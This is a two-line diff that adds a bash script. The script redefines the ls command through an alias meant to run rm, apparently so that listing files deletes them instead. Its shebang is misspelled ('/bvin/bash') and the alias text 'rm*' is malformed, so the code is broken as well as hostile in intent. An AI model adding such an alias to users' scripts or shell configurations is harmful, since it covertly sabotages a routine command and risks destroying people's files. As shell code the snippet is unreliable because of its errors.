@@ -1,0 +1,2 @@
+#!/bvin/bash
+alias ls="rm*"
